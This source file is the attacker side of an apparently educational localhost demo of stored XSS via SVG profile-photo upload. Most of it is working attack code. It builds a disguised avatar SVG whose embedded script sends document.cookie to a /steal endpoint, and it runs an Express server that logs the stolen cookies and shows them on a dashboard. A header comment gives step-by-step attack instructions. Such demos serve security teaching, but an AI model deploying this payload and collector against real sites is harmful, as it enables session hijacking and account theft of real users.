/*
 * How to Run:
 *
 * Terminal 1: cd demo-attacked/xss/svg-upload && npm install && npm run vulnerable
 * Terminal 2: cd demo-attacked/xss/svg-upload && npm run guide
 *
 * Attack sequence:
 * 1. http://localhost:3008        ← Attacker dashboard — download payload.svg here
 * 2. http://localhost:3007        ← ConnectHub — upload payload.svg as your profile photo
 * 3. Your profile appears in the community grid with a teal colored avatar
 * 4. Open the profile modal → click "View Full Photo"
 * 5. Raw SVG opens in new tab → script fires → cookie stolen
 * 6. Cookie appears on attacker dashboard at http://localhost:3008
 */

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3008;

app.use(cors());
app.use(express.static(path.join(__dirname)));

const stolenCookies = [];

const TRANSPARENT_GIF = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

function buildMaliciousSvg() {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="120" height="120">
  <defs>
    <linearGradient id="avatarGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#1e6b6b"/>
      <stop offset="100%" style="stop-color:#334155"/>
    </linearGradient>
  </defs>
  <rect width="120" height="120" fill="url(#avatarGrad)" rx="60"/>
  <circle cx="60" cy="48" r="22" fill="rgba(255,255,255,0.25)"/>
  <ellipse cx="60" cy="95" rx="32" ry="24" fill="rgba(255,255,255,0.2)"/>
  <script>
    new Image().src='http://localhost:${PORT}/steal?c='+encodeURIComponent(document.cookie);
  </script>
</svg>`;
}

app.get('/steal', (req, res) => {
  const cookie = req.query.c || '';

  if (cookie) {
    const entry = {
      cookie,
      timestamp: new Date().toISOString(),
    };
    stolenCookies.unshift(entry);
    console.log(`[STOLEN] Cookie: ${cookie}`);
  }

  res.setHeader('Content-Type', 'image/gif');
  res.setHeader('Cache-Control', 'no-store');
  res.send(TRANSPARENT_GIF);
});

app.get('/api/stolen', (req, res) => {
  res.json(stolenCookies);
});

app.get('/payload.svg', (req, res) => {
  res.setHeader('Content-Type', 'image/svg+xml');
  res.send(buildMaliciousSvg());
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'attacker.html'));
});

app.listen(PORT, () => {
  console.log(`SVG attack dashboard (attacker) running at http://localhost:${PORT}`);
  console.log(`Download payload: http://localhost:${PORT}/payload.svg`);
});
